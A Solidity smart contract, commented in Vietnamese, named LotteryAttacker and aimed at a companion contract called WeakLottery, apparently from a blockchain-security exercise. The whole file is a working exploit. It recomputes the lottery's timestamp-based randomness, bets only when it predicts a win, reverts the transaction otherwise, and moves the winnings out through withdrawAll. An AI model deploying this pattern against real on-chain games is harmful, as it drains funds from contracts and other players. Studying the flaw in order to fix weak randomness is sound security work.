// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "./WeakLottery.sol";

contract LotteryAttacker {
    WeakLottery public lottery;

    constructor(address payable _lotteryAddress) {
        lottery = WeakLottery(_lotteryAddress);
    }

    function attack() public payable {
        require(msg.value >= 0.1 ether, "Need 0.1 ETH to play");

        // Mô phỏng chính xác cách WeakLottery tính toán
        // Lưu ý: msg.sender của WeakLottery lúc này chính là địa chỉ của contract này
        uint256 guess = uint256(keccak256(abi.encodePacked(block.timestamp, address(this)))) % 2;
        
        if (guess == 1) {
            // Chỉ gửi tiền nếu biết chắc chắn sẽ thắng
            lottery.play{value: 0.1 ether}();
        } else {
            // Nếu thuật toán cho ra kết quả thua (0), ta hủy giao dịch để bảo toàn tiền cược
            revert("Predicting Loss: Skipping this block...");
        }
    }
    
    // Nhận tiền thưởng về contract
    receive() external payable {}

    // Hàm để rút tiền từ Attacker về ví cá nhân
    function withdrawAll() public {
        payable(msg.sender).transfer(address(this).balance);
    }
}